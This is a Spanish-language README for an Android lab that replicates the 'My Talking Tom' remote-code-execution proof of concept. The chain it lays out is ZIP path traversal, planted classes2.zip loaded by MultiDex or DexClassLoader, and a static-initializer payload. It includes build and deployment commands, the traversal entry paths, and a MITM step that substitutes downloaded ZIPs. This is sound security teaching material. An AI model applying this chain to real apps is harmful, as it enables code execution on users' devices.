# RCE Lab - My Talking Tom PoC Replication

## Overview

Este laboratorio replica **exactamente** la vulnerabilidad del PoC "My Talking Tom" que utiliza:

- **Path traversal ZIP** para colocar archivos maliciosos automáticamente
- **MultiDex 1.0.1** que carga automáticamente `classes2.zip` desde `code_cache/secondary-dexes/` (
  Dalvik ≤ API 20)
- **DexClassLoader explícito** para cargar payload en Android moderno (ART ≥ API 21)
- **Static initializer** en payload DEX para ejecución automática al cargar la clase

## Compatibilidad Android

### Dalvik (API ≤ 20) - Vector Original

- **MultiDex 1.0.1** funciona normalmente
- Auto-carga `classes2.zip` desde `secondary-dexes/`
- Requiere reinicio de app para activar payload

### ART (API ≥ 21) - Vector Moderno

- **MultiDex 1.0.1** se auto-deshabilita con mensaje:
  ```
  I MultiDex: VM has multidex support, MultiDex support library is disabled
  ```
- **DexClassLoader** carga payload inmediatamente después de path traversal
- **No requiere reinicio** - RCE inmediato

## Arquitectura del Ataque

```text
           ┌─────────┐                                     ┌───────────────┐
           │  MITM   │─── inyecta 2 entradas con traversals ─▶ /data/data/ │
  legit    │ script  │                                         com.app.lab. │
Creative ─▶│ (zip)   │── busybox  → …/files/busybox            rce/         │
  .zip     └─────────┘── classes2.zip → …/code_cache/…         …            │
                                                               └─────────────┘
                         ▼                                        ▲
                    AdUpdateService                               │
                  descomprime el ZIP                             │
                         │                                       │
                         ▼                                       │
                ┌─────────────────┐                             │
                │ Detección OS:   │                             │
                │ Dalvik ≤ API 20 │ ──── MultiDex auto-load ────┘
                │ ART ≥ API 21    │ ──── DexClassLoader explícito
                └─────────────────┘       (inmediato)
```

## Comandos Rápidos

```bash
# 1. Construir exploit bundle con path traversal
./build_payload.sh

# 2. Servir exploit bundle
cd payload/build && python3 -m http.server 8000 &

# 3. Setup dispositivo Android (emulador)
adb reverse tcp:8000 tcp:8000

# 4. Instalar aplicación vulnerable
./gradlew installDebug

# 5. Iniciar aplicación (descarga automática del exploit)
adb shell am start -n com.app.lab.rce/.MainActivity

# 6. Reiniciar para activar MultiDex auto-load
adb shell am force-stop com.app.lab.rce
adb shell am start -n com.app.lab.rce/.MainActivity

# 7. Verificar compromiso
adb shell cat /data/data/com.app.lab.rce/files/pwned.txt
```

## Componentes Técnicos

### 1. Exploit Bundle (`exploit_bundle.zip`)

Contiene dos entradas con path traversal:

- `../../../../data/data/com.app.lab.rce/files/busybox` (ejecutable)
- `../../../../data/data/com.app.lab.rce/code_cache/secondary-dexes/com.app.lab.rce-classes2.zip`

### 2. Aplicación Vulnerable

- **MultiDex 1.0.1**: Carga automáticamente ZIPs desde `secondary-dexes/` (solo Dalvik)
- **DexClassLoader**: Carga explícita para compatibilidad ART (API 21+)
- **AdUpdateService**: Descarga, extrae ZIPs y ejecuta payload inmediatamente
- **RCEApplication**: Custom Application con `MultiDex.install()`

### 3. Payload Malicioso

- **Solo 15 líneas**: Payload extremadamente simple y directo
- **Static initializer**: Se ejecuta automáticamente al cargar la clase
- **Evidencia simple**: Crea `/data/data/com.app.lab.rce/files/pwned.txt` con fecha y UID
- **Sin dependencias**: No requiere Context ni librerías Android

### 4. MITM Script (Opcional)

- **Sustitución directa**: Reemplaza cualquier ZIP descargado por `exploit_bundle.zip`
- **Filtro inteligente**: Solo intercepta archivos `.zip` con magic bytes `PK`
- **Simple y efectivo**: 40 líneas vs 135 líneas anterior

## Archivos Clave

```
├── build_payload.sh              # Construye exploit_bundle.zip
├── app/src/main/java/com/app.lab/rce/
│   ├── RCEApplication.kt          # Custom Application (MultiDex)
│   ├── AdUpdateService.kt         # Descarga, extrae y carga payload
│   └── MainActivity.kt            # Inicia servicio automático
├── payload/src/pwn/Shell.java     # Payload con static initializer
└── mitmproxy/inject_payload.py    # MITM para inyección (opcional)
```

## Indicadores de Compromiso

### Logs Esperados (ART API 21+)
```
D VungleService: 💥 MY TALKING TOM POC: ZIP extraído con path traversal
D VungleService: 📂 Archivos colocados automáticamente en:
D VungleService:    - /files/busybox (executable)
D VungleService:    - /code_cache/secondary-dexes/classes2.zip
D VungleService: 🚀 Cargando DEX: com.app.lab.rce-classes2.zip
E VungleService: 💀 PAYLOAD CARGADO: pwn.Shell
E VungleService: 🔴 SISTEMA COMPROMETIDO - RCE EJECUTADO
```

### Logs Esperados (Dalvik API ≤ 20)

```
I MultiDex: Installing application
I MultiDex: VM has multidx support = false
# Payload se ejecuta en próximo reinicio
```

### Archivos Creados

- `/data/data/com.app.lab.rce/files/pwned.txt` - Evidencia principal del compromiso
- `/data/data/com.app.lab.rce/files/busybox` (ejecutable)
- `/data/data/com.app.lab.rce/code_cache/secondary-dexes/com.app.lab.rce-classes2.zip`

## Verificar Compromiso

```bash
# Verificar archivo de evidencia
adb shell cat /data/data/com.app.lab.rce/files/pwned.txt
# Ejemplo output: PWNED Mon Jun 23 21:16:45 GMT 2025 UID=uid=10XXX(com.app.lab.rce) gid=10XXX(com.app.lab.rce)
```

## Consideraciones de Seguridad

⚠️ **Solo para uso educativo y de investigación**

- Usar únicamente en entornos controlados
- No ejecutar en dispositivos de producción
- Respetar las leyes Locales de ciberseguridad

## Referencias

- [NowSecure - MultiDex RCE Vulnerability](https://www.nowsecure.com/blog/2017/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/)
- [My Talking Tom PoC](https://github.com/nowsecure/android-rce-multidex-and-zip-files)
- [Android MultiDex Documentation](https://developer.android.com/studio/build/multidex)
